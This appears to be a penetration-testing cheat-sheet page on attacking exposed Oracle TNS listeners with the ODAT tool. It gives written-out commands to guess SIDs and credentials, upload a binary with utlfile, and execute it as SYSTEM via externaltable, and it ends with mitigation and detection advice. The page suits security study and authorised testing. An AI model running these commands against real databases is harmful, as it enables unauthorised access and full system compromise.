---
topic: Oracle ODAT
tags: [windows, oracle, odat, database, system]
---

# Oracle ODAT

[🌐 Español](oracle-odat.md) | **English**

## Concept

ODAT automates Oracle TNS enumeration and exploitation: discover SIDs, guess credentials, upload files with `utlfile` and execute commands with `externaltable`. On Windows the service usually runs as SYSTEM.

## When it applies

- Port 1521/TNS exposed.
- Oracle Express Edition with SID `XE`.
- Default credentials or active sample accounts.

## Procedure

1. Confirm the version with `nmap`.
2. Enumerate SIDs with `sidguesser`.
3. Guess credentials with `passwordguesser`.
4. Upload a binary and run it with `externaltable`.

```bash
odat sidguesser -s <IP> -p 1521
odat passwordguesser -s <IP> -p 1521 -d XE --accounts-file accounts.txt
odat utlfile -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --putFile C:\\ temp cmd.exe
odat externaltable -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --exec C:\\ temp cmd.exe
```

## Variants

- `dbms_scheduler` to run jobs.
- `dbms_java` when Java is enabled.
- Manual `sqlplus` with the same credentials.
- TNS listener poisoning.

## Limitations

- The service must accept external connections.
- Accounts need sufficient privileges.
- `utlfile` may be restricted by directories.

## Mitigation and detection

- Do not expose 1521; segment the database.
- Change defaults and disable sample accounts.
- Run Oracle as a low-privilege account.
- Alert on `utlfile`, `externaltable` and anomalous TNS connections.

## References

- <https://github.com/quentinhardy/odat>
- <https://www.oracle.com/security-alerts/>
- <https://attack.mitre.org/techniques/T1190/>
